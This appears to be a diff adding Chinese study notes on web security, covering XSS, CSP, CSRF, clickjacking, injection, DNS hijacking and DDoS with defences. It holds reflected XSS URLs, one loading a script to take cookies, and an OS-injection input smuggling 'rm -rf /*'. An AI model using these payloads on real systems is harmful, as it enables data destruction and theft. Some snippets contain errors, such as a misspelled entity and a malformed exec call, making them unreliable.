@@ -1,0 +1,170 @@
+### 常见的web攻击方式
+- xss
+- csrf
+- 点击劫持
+- Sql注入
+- OS注入
+- 请求劫持
+- DDOS
+
+### 方法方法
+- 密码安全 - 密码加固
+- 密码学(对称和非对称)
+- 传输安全
+NodeJs安全框架 htmelt
+CSP策略， content-security-policy
+
+### xss
+跨站脚本攻击 Cross Site Scripting，因为简写和css冲突，所以只能叫xss，跨站脚本共计是指通过存在安全漏洞的web网站注册用户的浏览器内运行非法的html标签或javascript进行一种攻击
+危害:
+- 利用虚假输入表单骗取用户个人信息
+- 利用脚本窃取用户的cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求
+- 显示伪造的文章或图片
+- 获取页面数据
+- 获取cookies
+- 劫持前端逻辑
+- 发送请求
+- 偷取网站的任意数据
+- 偷取用户的资料
+- 偷取用户的秘密和登录态
+- 欺骗用户
+```
+// 普通
+http://127.0.0.1:3000/?from=china
+// alert 尝试
+http://127.0.0.1:3000/?from=<script>alert(1)</script>
+// 引入js，执行第三方js, 获取cookie
+http://127.0.0.1:3000/?from=<script src="http://127.0.0.1:4000/hack.js"></script>
+
+```
+用户知道屏蔽来历不明的网站，攻击者可能会将网址伪装成公信力强的短连接，进行攻击
+攻击手段主要借助url反射来实现，或者存储到数据库，再进行显示。
+原子弹式攻击方式，无线扩散
+
+防范手段
+- ejs
+```
+<%=name%> // 使用等号渲染，或转移html
+<%-name%> // 不使用减号渲染，因为减号不会转译
+```
+- HEAD
+```
+ctx.set('X-XSS-Protection', 0); // 禁止xss过滤
+```
+0: 禁止XSS过滤
+1: 启用XSS过滤，通常浏览器是默认的，如果检测到跨站脚本攻击，浏览器将清除页面中不安全的部分, 默认为1
+1:mode=block 启用XSS过滤，如果检测到攻击，浏览器不会清除，而是阻止页面加载
+
+### CSP
+内容安全策略，Content Security Policy 是一个附加的安全层,用户帮助检测和缓解某些类型的攻击，包括跨站脚本和数据注入攻击，这些攻击可用于实现从数据窃取到网站破坏或作为恶意软件分发版本等用途。
+CSP本质上就是建立白名单，开发者明确告诉浏览器，哪些外部资源可以加载和执行，我们只需要配置规则，如果拦截是由浏览器自己实现的，我们可以通过这种方式来尽量减少XSS攻击
+```
+// 只允许加载本站资源
+Content-Security-Policy: default-src 'self'
+ctx.set("Content-Security-Policy", "default-src 'self'");
+// 只允许加载HTTPS协议图片
+Content-Security-Policy: img-src https://*
+// 不允许加载任何来源框架
+Content-Security-Policy: child-src 'none'
+```
+转译
+```
+function escape(str) {
+    str = str.replace(/&/g, '&amp;');
+    str = str.replace(/</g, '&lt;');
+    str = str.replace(/>/g, '&gt;');
+    str = str.replace(/"/g, '&quto;');
+    str = str.replace(/'/g, '&#39;');
+    str = str.replace(/`/g, '&#96;');
+    str = str.replace(/\//g, '&#x2F;');
+    return str;
+}
+```
+富文本来说，显然不能通过上面的办法来转译所有字符，因为这样会把需要的格式也过滤掉，对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单
+白名单
+```
+const xss = require('xss');
+const html = xss('<h1 id="title">XSS Demo</h1><script>alert("XSS")</script>')
+console.log(html);
+// <h1 id="title">XSS Demo</h1>&ltlscript&gt;alert("XSS")&lt;/script&gt;
+```
+转译了敏感标签，其他不会转译
+
+HttpOnly Cookie
+这是预防XSS攻击窃取用户cookie最有效的防御手段，Web应用程序在设置cookie时，将其属性设为HttpOnly, 就可以避免改网页的cookie被客户端恶意Javascript窃取，保护用户cookie信息。
+```
+response.addHeader('Set-Cookie', "uid=123; path=/; HttpOnly");
+```
+
+### CSRF 
+Cross Site Request Forgery 即跨站请求伪造，是一种常见的Web攻击，他利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作
+- 用户已经登录了站点A, 并在本地记录了cookie
+- 在用户没有登出站点A的情况下(也就是cookie生效的情况下)，访问了恶意攻击者提供的引诱危险站点B(B站点要求访问站点A)
+- 站点A没有做任何CSRF防御
+
+B网站生成一个form表单，通过post请求的方式，进行提交，提交到A网站的接口中，因为是浏览器请求，所以会使用A网站的登录状态，完成攻击目的。
+
+危害
+- 利用用户登录状态
+- 用户不知情
+- 完成业务请求
+- 盗用用户资金(转账，消费)
+- 冒充用户发帖背锅
+- 损害网站声誉
+
+防御
+- 禁止第三方网站带Cookie - 有兼容性
+- Referer Check - Https 不发送referer
+```
+app.use(async (ctx, next) => {
+    await next();
+    const referer = ctx.request.header.referer
+    console.log('Referer:', referer);
+})
+```
+- 验证码
+
+### 点击劫持 clickjacking
+点击劫持是一种视觉欺骗的攻击手段，攻击者将需要攻击的网站通过iframe 嵌套的方式嵌入自己的网页中，并将iframe设置为透明，在页面中透出一个按钮诱导用户点击。
+
+防御
+- X-FRAME-OPTIONS
+是一个HTTP响应头，在现代浏览器有一个很好的支持，这个Http响应头就是为了防御用iframe嵌套的点击劫持攻击。
+该响应头有三个值可选
+- DENY
+不允许通过iframe的方式展示
+- SAMEORIGIN
+页面可以在相同域名下通过iframe的方式展示
+-ALLOW-FROM
+可以在指定来源的iframe中展示
+
+### Sql注入
+攻击数据库
+
+### OS 注入
+OS命令注入和SQL注入差不多，只不过SQL注入是针对数据库，而OS命令注入是针对操作系统的，os命令注入攻击指通过web应用，执行非法的操作系统命令达到攻击的目的，只要在能调用shell函数的地方就存在被攻击的风险，倘若调用shell时存在疏漏，就可以执行插入的非法命令
+```
+const exec = require('mz/child_process').exec;
+const params = { /* 用户输入的参数*/}
+exec(`git clone ${params.repo}`) /some/path;
+
+//如果传入的参数是这样会怎样 https://github.com/xx/xx.git && rm -rf /* &&
+```
+
+### DNS劫持
+顾名思义，DNS服务器(DNS解析各个步骤)被篡改了，修改了域名解析的结果, 使得访问到的不是预期的ip
+- http劫持
+运营商劫持，此时大概只能升级https了
+
+### DDOS
+distributed denial of service
+DDOS 不是一种攻击，而是一大类攻击的总称，他有十几种类型，新的攻击方法还在不断的发明出来，网站运行的各个环节，都可以是攻击目标，只要把一个环节攻破，使得整个流程跑不起来，就达到了瘫痪服务的目的。
+其中，比较常见的一种攻击是cc攻击，他就是简单粗暴的送来大量正常的请求，超出服务器的最大承受量，到底宕机。我遭遇的就是cc攻击，最多的时候全世界大概20多个ip地址轮流发出请求，每个地址请求量在每秒200-300次，我看访问日志的时候，就感觉那些请求像洪水一样涌来，一眨眼一大堆，几分钟的时间，日志文件的体积就大了100MB, 说实话，这只能算小攻击，但是我的个人网站没有任何防护，服务器还是跟其他人共享的，这种流量一来立刻就下线了。
+
+防御方式
+- 备份网站
+停机，切换域名，
+- http请求拦截
+硬件 服务器 防火墙
+- 宽带扩容 + CDN
+提供犯罪成本
